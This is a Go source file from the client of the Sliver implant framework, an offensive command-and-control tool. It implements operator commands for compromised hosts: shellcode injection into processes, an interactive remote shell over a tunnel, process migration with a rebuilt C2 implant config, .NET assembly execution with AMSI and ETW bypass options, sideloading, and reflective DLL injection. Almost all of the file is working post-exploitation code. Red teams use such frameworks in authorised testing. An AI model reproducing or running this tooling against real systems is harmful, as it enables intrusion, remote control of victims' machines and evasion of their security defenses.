package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"context"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/ssh/terminal"

	"github.com/desertbit/grumble"
)

func executeShellcode(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a path to the shellcode\n")
		return
	}
	interactive := ctx.Flags.Bool("interactive")
	pid := ctx.Flags.Uint("pid")
	shellcodePath := ctx.Args[0]
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
		return
	}
	if pid != 0 && interactive {
		fmt.Printf(Warn + "Cannot use both `--pid` and `--interactive`\n")
		return
	}
	if interactive {
		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, ctx.Flags.Bool("rwx-pages"), rpc)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	task, err := rpc.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: ctx.Flags.Bool("rwx-pages"),
		Pid:      uint32(pid),
		Request:  ActiveSession.Request(ctx),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	if task.Response.GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", task.Response.GetErr())
		return
	}
	fmt.Printf(Info + "Executed shellcode on target\n")
}

func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, rpc rpcpb.SliverRPCClient) {
	// Check active session
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	// Start remote process and tunnel
	noPty := false
	if session.GetOS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}

	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	shell, err := rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   ActiveSession.Request(ctx),
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	_, err = rpc.Task(context.Background(), &sliverpb.TaskReq{
		Request:  ActiveSession.Request(ctx),
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	fmt.Printf(Info+"Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(Warn + "Failed to save terminal state")
			return
		}
	}

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			fmt.Printf(Warn+"Error writing to stdout: %v", err)
			return
		}
	}()
	for {
		log.Printf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		log.Printf("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf(Warn+"Error reading from stdin: %v", err)
			break
		}
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()

}

func migrate(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}

	if len(ctx.Args) != 1 {
		fmt.Printf(Warn + "You must provide a PID to migrate to")
		return
	}

	pid, err := strconv.ParseUint(ctx.Args[0], 10, 32)
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
	}
	config := getActiveSliverConfig()
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Migrating into %d ...", pid)
	go spin.Until(msg, ctrl)
	migrate, err := rpc.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:     uint32(pid),
		Config:  config,
		Request: ActiveSession.Request(ctx),
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	ctrl <- true
	<-ctrl
	if !migrate.Success {
		fmt.Printf(Warn+"%s\n", migrate.GetResponse().GetErr())
		return
	}
	fmt.Printf("\n"+Info+"Successfully migrated to %d\n", pid)
}

func executeAssembly(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "Please provide valid arguments.\n")
		return
	}
	assemblyBytes, err := ioutil.ReadFile(ctx.Args[0])
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ctx.Args) == 2 {
		assemblyArgs = ctx.Args[1]
	}
	process := ctx.Flags.String("process")

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	executeAssembly, err := rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:    ActiveSession.Request(ctx),
		AmsiBypass: ctx.Flags.Bool("amsi"),
		Process:    process,
		Arguments:  assemblyArgs,
		Assembly:   assemblyBytes,
		EtwBypass:  ctx.Flags.Bool("etw"),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	if executeAssembly.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", executeAssembly.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ctx.Flags.Bool("save") {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(Info+"Assembly output:\n%s", string(executeAssembly.GetOutput()))
	if outFilePath != nil {
		outFilePath.Write(executeAssembly.GetOutput())
		fmt.Printf(Info+"Output saved to %s\n", outFilePath.Name())
	}
}

func sideload(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	binPath := ctx.Args[0]

	entryPoint := ctx.Flags.String("entry-point")
	processName := ctx.Flags.String("process")
	args := ctx.Flags.String("args")

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	sideload, err := rpc.Sideload(context.Background(), &sliverpb.SideloadReq{
		Request:     ActiveSession.Request(ctx),
		Args:        args,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	if sideload.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", sideload.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ctx.Flags.Bool("save") {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(Info+"Output:\n%s", sideload.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideload.GetResult()))
		fmt.Printf(Info+"Output saved to %s\n", outFilePath.Name())
	}
}

func spawnDll(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		return
	}
	var args string
	if len(ctx.Args) < 1 {
		fmt.Printf(Warn + "See `help spawndll` for usage.")
		return
	} else if len(ctx.Args) > 1 {
		args = ctx.Args[1]
	}

	binPath := ctx.Args[0]
	processName := ctx.Flags.String("process")
	exportName := ctx.Flags.String("export")
	offset, err := getExportOffset(binPath, exportName)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(Warn+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
	spawndll, err := rpc.SpawnDll(context.Background(), &sliverpb.SpawnDllReq{
		Request:     ActiveSession.Request(ctx),
		Args:        args,
		Data:        binData,
		ProcessName: processName,
		Offset:      offset,
	})

	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	ctrl <- true
	<-ctrl
	if spawndll.GetResponse().GetErr() != "" {
		fmt.Printf(Warn+"Error: %s\n", spawndll.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ctx.Flags.Bool("save") {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(Info+"Output:\n%s", spawndll.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(spawndll.GetResult()))
		fmt.Printf(Info+"Output saved to %s\n", outFilePath.Name())
	}
}

// -------- Utility functions

func getActiveSliverConfig() *clientpb.ImplantConfig {
	session := ActiveSession.Get()
	if session == nil {
		return nil
	}
	c2s := []*clientpb.ImplantC2{}
	c2s = append(c2s, &clientpb.ImplantC2{
		URL:      session.GetActiveC2(),
		Priority: uint32(0),
	})
	config := &clientpb.ImplantConfig{
		Name:    session.GetName(),
		GOOS:    session.GetOS(),
		GOARCH:  session.GetArch(),
		Debug:   true,
		Evasion: session.GetEvasion(),

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.ImplantConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

// ExportDirectory - stores the Export data
type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
	var offset uint32
	for _, section := range pefile.Sections {
		if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
			offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
		}
	}
	return offset
}

func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
	nameRva := binary.LittleEndian.Uint32(rawData[index:])
	nameFOA := rvaToFoa(nameRva, fpe)
	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
	if err != nil {
		log.Fatal(err)
		return ""
	}
	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
	return funcName
}

func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
	ordRva := binary.LittleEndian.Uint16(rawData[index:])
	funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
	funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
	funcOffset := rvaToFoa(funcRVA, fpe)
	return funcOffset
}

func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
	rawData, err := ioutil.ReadFile(filepath)
	if err != nil {
		return 0, err
	}
	handle, err := os.Open(filepath)
	if err != nil {
		return 0, err
	}
	defer handle.Close()
	fpe, _ := pe.NewFile(handle)
	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}
